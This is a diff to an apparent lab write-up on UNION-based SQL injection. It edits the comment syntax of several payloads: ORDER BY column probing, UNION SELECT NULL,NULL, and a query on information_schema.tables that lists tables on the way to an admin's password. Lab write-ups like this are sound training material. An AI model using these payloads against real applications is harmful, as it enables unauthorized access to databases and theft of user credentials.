@@ -42,7 +42,7 @@ In Burp Suite, I intercepted this request and sent it to Repeater
 ### 2. Determine the number of columns
 By injecting the following payloads one by one: 
 ```text
-' ORDER BY 1#
+' ORDER BY 1--
 ...
 ```
 I got that there were 2 columns  
@@ -50,13 +50,13 @@ I got that there were 2 columns
 ### 3. Confirm UNION works
 Since there were 2 columns, I injected:   
 ```text
-' UNION SELECT NULL,NULL#
+' UNION SELECT NULL,NULL--
 ```
 
 ### 4. Get admin's password  
 I injected   
 ```text
-'+UNION+SELECT+table_name,'a'+FROM+information_schema.tables--
+'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
 ```
 to get the list of the the table.  
 I found the table related to user and it was: **users_qkxziz**  
